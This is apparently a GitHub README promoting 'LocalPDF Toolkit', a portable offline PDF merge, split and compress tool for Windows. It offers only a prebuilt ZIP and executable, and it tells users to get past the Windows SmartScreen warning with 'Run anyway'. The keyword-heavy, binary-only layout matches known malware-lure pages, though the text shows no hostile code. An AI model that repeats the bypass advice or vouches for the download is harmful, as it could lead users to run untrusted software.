<p align="center">
  <img src="https://i.postimg.cc/652sMJx1/banner.png" alt="LocalPDF Toolkit — Offline PDF Merge, Page Splitter & File Compressor for Windows" width="100%">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Windows%2010%2F11%20x64-0078D6?style=flat-square&logo=windows" alt="Platform: Windows 10/11 x64">
  <img src="https://img.shields.io/badge/Mode-Offline%20PDF%20Toolkit-2EA44F?style=flat-square" alt="Mode">
  <img src="https://img.shields.io/badge/Release-localpdf--v1.5-5391FE?style=flat-square" alt="Release Tag">
  <img src="https://img.shields.io/badge/License-MIT-8B5CF6?style=flat-square" alt="License: MIT">
</p>

# LocalPDF Toolkit — Offline PDF Merge, Page Splitter & File Compressor for Windows

**Need to merge contracts, extract specific pages, or shrink a 35 MB scanned PDF for an email/portal limit without uploading confidential documents to random websites? Process unlimited PDFs 100% offline on Windows.**

LocalPDF Toolkit brings essential document operations into a lightweight portable Windows app: **combining multiple PDFs with drag-and-drop page ordering, extracting or deleting specific page ranges, and compressing bloated scanned images inside PDFs without watermarks or daily task limits**.

This project is aimed at **Windows 10 and Windows 11 (64-bit) office users, students, and freelancers** handling private PDFs offline without Adobe Acrobat subscriptions.

## Quick Use-Case & Troubleshooting Reference

| Scenario / Issue | Cause | Solution |
| --- | --- | --- |
| Online PDF sites limit free users to 2 files per hour | Web tools throttle free tasks and add watermarks | Merge, split, and compress unlimited PDFs locally with zero limits |
| Scanned PDF is 35 MB and rejected by email / upload portals | Uncompressed 300–600 DPI scanner images inside the PDF | Apply smart 150 DPI / JPEG stream compression to shrink size by 80%+ |
| Uploading bank statements, IDs, or contracts online is unsafe | Cloud PDF converters store sensitive documents on external servers | Keep 100% of document processing offline in local RAM |
| Need to extract pages 4–9 or rotate sideways scanned pages | Windows built-in PDF viewer lacks page reordering and extraction | Select exact page ranges (`1, 4-9, 12`) and export a clean PDF |

## Download for Windows

[**Download LocalPDF.zip — Latest GitHub Release (Windows x64)**](../../releases/latest/download/LocalPDF.zip)  
[View All Releases & Changelog](../../releases) · [Report an Issue](../../issues)

### Why use `LocalPDF.exe`? (Key features)

- Merges multiple PDF files with drag-and-drop file ordering and page range selection.
- Splits a PDF into individual pages or extracts specific page ranges (`e.g. 2-5, 10`).
- Compresses heavy scanned PDFs using configurable image DPI (`150 DPI` / `100 DPI`) and stream optimization.
- Adds zero watermarks, requires no subscription, and works 100% offline.

### Sample Output

```text
[LocalPDF] Loaded: Tax_Application_Scan.pdf (14 pages | 32.6 MB)
[INFO] Compression Mode : Balanced Web/Email (150 DPI, JPEG Quality 80%)
[OK]   Exported PDF     : Tax_Application_Scan_compressed.pdf (2.84 MB | -91.3% size)
```

The release ZIP is named `LocalPDF.zip`; the Windows executable inside is named `LocalPDF.exe`.

1. Close LocalPDF before updating or replacing executable files.
2. Click **Download LocalPDF.zip** above.
3. Right-click the downloaded archive and choose **Extract All**.
4. Open the extracted folder and run `LocalPDF.exe`.
5. Review the options and output paths before processing files.

**Requirements:** Windows 10 or 11 (64-bit) with read/write access to your document folders.

### Verification & Windows SmartScreen Note

- **Offline & standard user permissions:** `LocalPDF.exe` runs locally without uploading your files and does not require disabling Windows Defender.
- **Windows SmartScreen:** Because this is an independent open-source utility without a commercial EV code-signing certificate, Windows SmartScreen may show *"Windows protected your PC"* on first launch. Click **More info → Run anyway** after verifying the release checksum on the [Releases](../../releases) page.

## Problems this project solves

### Privacy risks of uploading sensitive PDFs to free web tools

Tax forms, signed contracts, and ID scans should never be uploaded to third-party servers just to merge two pages.

### Bloated scanner PDFs exceeding 5 MB–10 MB portal limits

Smart image downsampling shrinks scanned PDFs dramatically while keeping text sharp and readable.

### Clunky 'Microsoft Print to PDF' workarounds destroying bookmarks/text

Direct PDF stream manipulation preserves selectable text layers instead of rasterizing pages.

### Zero installation or bloat

Portable `.exe` opens instantaneously without background updater services.

## Default folders and configuration paths

LocalPDF saves merged, split, and compressed documents right next to your original files:

```text
%USERPROFILE%\Documents\
```

Typical directory layout:

```text
Documents\Contracts\
├── Part_A.pdf
├── Part_B.pdf
└── Merged_Contract.pdf   (Clean output, zero watermarks)
```

Original PDFs are never overwritten; outputs are saved with `_merged`, `_split`, or `_compressed` suffixes.

## Quick start guide

Follow these steps to get started:

1. **Extract `LocalPDF.zip` to a local folder.** No installation or admin privileges required.
2. **Launch `LocalPDF.exe` and drag your `.pdf` files onto the window.** Switch between **Merge**, **Split / Extract**, and **Compress** tabs.
3. **Arrange file order or enter target page ranges.** Choose compression level (`Light`, `Balanced 150 DPI`, or `Compact`).
4. **Click **Export PDF**.** Verify the resulting file in your PDF reader.

### Data safety note

Source PDF files remain untouched in their original folder.

## What the status summary shows

LocalPDF reports **page count, original file size, compressed file size, and percentage reduction**.

## FAQ

**Are my PDF files uploaded anywhere?**

No. LocalPDF runs 100% offline on your computer.

**Does compressing a PDF ruin selectable text?**

No. LocalPDF optimizes embedded raster images and streams while preserving selectable vector text.

**Is there any limit on file size or number of pages?**

No. You can process large multi-hundred-page PDFs locally.

## Useful reading

- [PDF Specification Reference (ISO 32000)](https://www.iso.org/standard/75839.html)

## More Windows Desktop Utilities

- [SnipText-ScreenOCRClipboard](../SnipText-ScreenOCRClipboard) — Instant hotkey screen region OCR text extractor to clipboard
- [ExifScrub-PhotoMetadataCleaner](../ExifScrub-PhotoMetadataCleaner) — Strip EXIF, GPS & PDF author metadata offline
- [SnapFormat-BatchMediaConverter](../SnapFormat-BatchMediaConverter) — Offline batch HEIC/WebP/MKV to JPG/PNG/MP4 converter
- [ClipVault-OfflineClipboardHistory](../ClipVault-OfflineClipboardHistory) — Offline Windows clipboard history & plain-text snippet manager

*Independent open-source desktop utility for Windows. Not affiliated with Adobe Inc.*
